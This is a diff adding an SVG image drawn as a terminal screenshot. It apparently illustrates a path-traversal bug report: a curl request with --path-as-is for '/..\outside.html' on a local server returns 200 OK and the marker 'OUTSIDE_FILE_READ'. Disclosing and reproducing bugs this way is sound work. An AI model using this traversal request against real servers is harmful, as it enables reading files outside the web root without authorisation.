@@ -1,0 +1,29 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1300" height="520" viewBox="0 0 1300 520">
+  <rect width="1300" height="520" fill="#0c0f12"/>
+  <style>
+    text {
+      font-family: Consolas, "Cascadia Mono", "Courier New", monospace;
+      font-size: 28px;
+      font-weight: 700;
+      fill: #d6d9dc;
+    }
+    .prompt { fill: #d6d9dc; }
+    .command { fill: #d6d9dc; }
+    .url { fill: #4db4ff; }
+    .muted { fill: #c8cdd2; }
+    .body { fill: #e2e5e7; }
+  </style>
+
+  <text x="20" y="45"><tspan class="prompt">PS C:\Users\jihun&gt; </tspan><tspan class="command">curl.exe -v --path-as-is </tspan><tspan class="url">"http://127.0.0.1:8080/..\outside.html"</tspan></text>
+  <text x="20" y="95" class="muted">*   Trying 127.0.0.1:8080...</text>
+  <text x="20" y="135" class="muted">* Established connection to 127.0.0.1 (127.0.0.1 port 8080) from 127.0.0.1 port 6156</text>
+  <text x="20" y="175" class="muted">* using HTTP/1.x</text>
+  <text x="20" y="215" class="muted">&gt; GET /..\outside.html HTTP/1.1</text>
+  <text x="20" y="255" class="muted">&gt; Host: 127.0.0.1:8080</text>
+  <text x="20" y="295" class="muted">&gt; User-Agent: curl/8.16.0</text>
+  <text x="20" y="335" class="muted">&gt; Accept: */*</text>
+  <text x="20" y="375" class="muted">* Request completely sent off</text>
+  <text x="20" y="415" class="muted">&lt; HTTP/1.1 200 OK</text>
+  <text x="20" y="455" class="muted">&lt; content-type: text/html</text>
+  <text x="20" y="495" class="body">OUTSIDE_FILE_READ</text>
+</svg>
